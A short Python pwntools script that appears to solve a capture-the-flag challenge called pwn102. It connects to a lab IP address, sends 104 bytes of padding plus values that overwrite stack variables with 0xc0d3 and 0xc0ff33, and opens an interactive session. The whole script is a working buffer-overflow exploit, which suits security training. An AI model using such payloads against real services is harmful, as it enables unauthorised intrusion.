from pwn import *

context.binary = elf = ELF('./pwn102-1644307392479.pwn102')

p = remote('10.10.138.24', 9002)

payload = 'A'*104
# note the 00 padding below to make up four byte chunks
payload += '\xd3\xc0\x00\x00' + '\x33\xff\xc0\x00'

print(p.recvline())
p.sendline(payload)
p.interactive()
